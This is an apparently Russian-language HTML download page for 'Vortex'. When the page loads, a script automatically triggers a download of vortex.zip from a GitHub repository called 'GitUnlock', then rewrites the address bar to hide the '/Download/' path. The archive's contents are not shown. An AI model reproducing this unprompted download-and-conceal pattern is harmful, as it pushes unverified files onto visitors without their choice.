<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex | Загрузка</title>
    <meta name="theme-color" content="#000000">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            background: linear-gradient(-45deg, #000000, #333333, #666666);
            background-size: 400% 400%;
            animation: gradientAnimation 15s ease infinite;
        }
        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #7b1fa2;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .status-text {
            font-size: 18px;
            text-align: center;
            max-width: 80%;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status-text" id="status">Начинаем загрузку Vortex...</div>

    <script>
        // Функция для очистки URL от /Download/
        function cleanUrl() {
            const url = window.location.href;
            if (url.includes('/Download/')) {
                const cleanUrl = url.replace('/Download/', '/');
                history.replaceState(null, null, cleanUrl);
            }
        }

        // Функция для скачивания файла
        function downloadFile() {
            const status = document.getElementById('status');
            status.textContent = "Подготовка скачивания...";
            
            // Создаем временную ссылку
            const link = document.createElement('a');
            link.href = 'https://github.com/serezanet2/GitUnlock/raw/refs/heads/main/Download/vortex.zip';
            link.download = 'vortex.zip';
            
            // Добавляем в документ и кликаем
            document.body.appendChild(link);
            link.click();
            
            // Удаляем ссылку
            setTimeout(() => {
                document.body.removeChild(link);
                status.textContent = "Файл скачивается...";
                
                // Очищаем URL
                cleanUrl();
                
                // Через 3 секунды обновляем статус
                setTimeout(() => {
                    status.textContent = "Загрузка завершена! Закройте эту страницу.";
                }, 3000);
            }, 100);
        }

        // Запускаем скачивание при загрузке страницы
        window.addEventListener('load', () => {
            setTimeout(downloadFile, 500);
        });
    </script>
</body>
</html>
